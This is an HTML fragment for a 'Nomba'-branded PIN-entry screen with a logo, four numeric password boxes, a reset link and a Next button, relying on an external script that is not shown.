    <title>Nomba</title>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"

    />
    <link rel="stylesheet" href="pin.css" />

  <body>
    <div class="container">
      <div class="logo">
        <img src="nombalogo.png" alt="" />
      </div>
      <div class="contentSec">
        <div class="title">Welcome</div>
        <div class="subTitle">Enter PIN for your Account</div>
      </div>
      <div class="formSec">
        <div class="input">
          <form method="post">
            <input
              type="password"
              id="digit1"
              class="pin-input"
              oninput="this.value = this.value.replace(/[^0-9]/g, '')"
              inputmode="numeric"
              pattern="[0-9]*"
              maxlength="1"
              required
            />
            <input
              type="password"
              id="digit2"
              class="pin-input"
              oninput="this.value = this.value.replace(/[^0-9]/g, '')"
              inputmode="numeric"
              pattern="[0-9]*"
              maxlength="1"
              required
            />
            <input
              type="password"
              id="digit3"
              class="pin-input"
              oninput="this.value = this.value.replace(/[^0-9]/g, '')"
              inputmode="numeric"
              pattern="[0-9]*"
              maxlength="1"
              required
            />
            <input
              type="password"
              id="digit4"
              class="pin-input"
              oninput="this.value = this.value.replace(/[^0-9]/g, '')"
              inputmode="numeric"
              pattern="[0-9]*"
              maxlength="1"
              required
            />
          </form>
          <div class="fgp">Forgot PIN? <a href="#">Reset it</a></div>
        </div>

        <div class="buttonSec">
          <button id="submitBtn" type="submit">Next</button>
        </div>
      </div>
    </div>

    <script src="pin.script.js"></script>
  </body>
